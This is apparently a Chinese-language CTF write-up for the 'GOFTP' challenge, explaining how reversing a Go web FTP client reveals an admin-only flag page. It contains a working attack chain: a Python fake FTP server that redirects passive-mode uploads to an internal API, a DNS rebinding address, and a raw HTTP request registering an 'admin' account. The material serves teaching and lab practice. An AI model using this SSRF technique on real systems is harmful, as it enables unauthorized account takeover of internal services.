# GOFTP

restful API在内网9000端口。

# How to Start and Stop
## start
```shell
docker-compose up -d
```

## stop
```shell
docker-compose down --rmi all
```

# writeup
此题的附件只给了一个二进制文件。而网站内容是一个ftp的web客户端，需要注册登录才能使用。

我们先逆向此二进制文件，尝试去理解其逻辑。

![image-20211230161845575](https://gitee.com/AFKL/image/raw/master/img/image-20211230161845575.png)

网站主要的函数如上，其中`ShowSecretPage`似乎比较惹人注目。其逻辑如下。

![image-20211230162003056](https://gitee.com/AFKL/image/raw/master/img/image-20211230162003056.png)

逻辑似乎是将读取`/flag`文件后，直接打印到浏览器里。我们看看这个controller录属于哪个路由。

![image-20211230162709650](https://gitee.com/AFKL/image/raw/master/img/image-20211230162709650.png)

![image-20211230162758453](https://gitee.com/AFKL/image/raw/master/img/image-20211230162758453.png)

在`SetRoute`逻辑中我们可以看到对应的路由。可以看到这个controller属于`/admin`和`/admin/index`两个路由。但`/admin`的路由组中有一个中间件是`adminSessionCheck`，跟踪到这个中间件的逻辑。

![image-20211230163152071](https://gitee.com/AFKL/image/raw/master/img/image-20211230163152071.png)

可以看到其是将session中的username属性拿出，用`strings.EqualFold`函数比较`admin`字符串，如果两者不相等则展示`forbidden.html`。

那么整个应用中唯一能与session交互的地方应该是注册和登录逻辑。

在注册逻辑中，用户禁止注册用户为`admin`的用户。且用的函数也是`strings.EqualFold`，不能在这里下手脚。
![image-20211230163556765](https://gitee.com/AFKL/image/raw/master/img/image-20211230163556765.png)

![image-20211230163612212](https://gitee.com/AFKL/image/raw/master/img/image-20211230163612212.png)

在创建用户的时候，应用会调用`WebFTPClient_model_CreateUser`而这个函数，这个函数将我们输入的数据编码后，用`grequests`库发给某个地址的`/api/user`路由。

![image-20211230164239157](https://gitee.com/AFKL/image/raw/master/img/image-20211230164239157.png)

题目描述中告知了restful api在9000端口，那么这里应该就是与restapi进行通信了。
这里获取`grequest`的发包方法有很多，这里就以`L3H_Sec`队伍的方法为例：
```
dlv挂上去断在json里调试看看config结构，写个config.json把服务跑起来，抓下注册请求的包， username改成admin。
```

因为整个应用是一个ftp的客户端，那么我们可以利用被动模式将上传文件的数据传到内网的restapi服务。
在upload逻辑中，我们可以看到应用调用了`goftp`库。

![image-20211230165349267](https://gitee.com/AFKL/image/raw/master/img/image-20211230165349267.png)

那么我们可以在github搜索到它的[源码](https://github.com/dutchcoders/goftp/blob/ed59a591ce14ff6c19c49be14294528d11a88c37/ftp.go#L419)。
在这里我们看见，开发者可能是为了安全或者偷懒，忽略了我们被动连接的ip，直接使用了当前连接主机的地址。

![image-20211230165626301](https://gitee.com/AFKL/image/raw/master/img/image-20211230165626301.png)

但问题不大，我们可以使用dns rebinding来规避。
为了dns rebinding成功，我使用了自己写的假ftp服务器。
```python
import socket
import time
import sys

sendfile_ip = "127.0.0.1:9000"

def ip2server(ip):
    host, port = str(ip).split(":")
    return ('0.0.0.0', int(port))

def ip2pasv(ip):
    host, port = str(ip).split(":")
    return tuple([int(i) for i in host.split(".")]) + (int(port) // 256, int(port) % 256)

RETR_COMPLETE = b"226 Transfer complete.\r\n"
ftp_table = {
    "USER" : b"331 Username ok, send password.\r\n",
    "PASS" : b"230 Login successful.\r\n",
    "TYPE" : b"200 Type set to: Binary.\r\n",
    "EPSV" : b"500 'EPSV': command not understood.\r\n",
    "RETR" : b"150 File status okay. About to open data connection.\r\n",
    "STOR" : b"150 File status okay. About to open data connection.\r\n",
    "QUIT" : b"221 Goodbye.\r\n",
    "PASV" : b"227 Entering passive mode (%d,%d,%d,%d,%d,%d).\r\n" % (ip2pasv(sendfile_ip))
}

s = socket.socket()
s.bind(("0.0.0.0", int(sys.argv[1])))
s.listen(1)

while True:
    print("="*30)
    c, addr = s.accept()
    print('已链接:', addr)

    c.send(b'220 pyftpdlib 1.5.6 ready.\r\n')
    # time.sleep(10)
    while True:
        data = str(c.recv(1024).decode("utf-8")).replace("\n", "")
        print(addr, " -> self:", data)
        comm = data[:4]
        time.sleep(5)
        c.send(ftp_table.get(comm))
        print("self ->", addr, ":", ftp_table.get(comm).decode("utf-8").replace("\n", ""))

        if comm == "RETR":
            c.send(RETR_COMPLETE)
            print("self ->", addr, ":", RETR_COMPLETE.decode("utf-8").replace("\n", ""))
        elif comm == "QUIT":
            c.close()
            break
```

也可以使用`pyftpdlib`库。

在upload路由填上准备好的dns rebind域名和注册admin用户的http请求包文件上传文件
```
addr: ftp://fan:root@make-vpsip-rebindfor60safter1times-127.0.0.1-rr.1u.ms:8877
file: 文件内容如下

PUT /api/user HTTP/1.1
Host: 127.0.0.1:9000
User-Agent: GRequests/0.10
Content-Length: 64
Content-Type: application/json
Accept-Encoding: gzip

{"email":"afklmm@qq.com","password":"123456","username":"admin"}
```

当ftp的响应卡在150响应之后，代表ssrf成功。
使用上面文件发送的账号登录，访问admin路由即可拿到flag。